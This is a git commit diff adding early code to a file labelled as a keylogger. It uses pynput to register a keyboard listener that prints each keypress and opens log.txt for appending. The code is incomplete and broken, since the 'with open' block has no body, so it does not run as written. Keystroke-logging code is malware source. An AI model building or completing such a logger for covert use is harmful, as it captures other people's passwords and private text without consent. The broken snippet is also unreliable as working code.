312f7a70490f77461dd58c8949925b4592ba4d0c
Alejandro Sandoval <asandoval2540@gmail.com>
2026-02-06 23:02:43 -0600

    Add files via upload

--- Main.py
+++ Main.py
@@ -1,6 +1,13 @@
 #Main keylogger
 import pynput
-from pynput.keyboard import Key, Listener
+from pynput import keyboard
 import logging
 
+def Keypress(key):
+    print(str(key))
+    with open("log.txt", "a") as log:
+if __name__ == "__main__":
+    listner = keyboard.Listener(on_press=Keypress)
+    listner.start()
+    input()
 
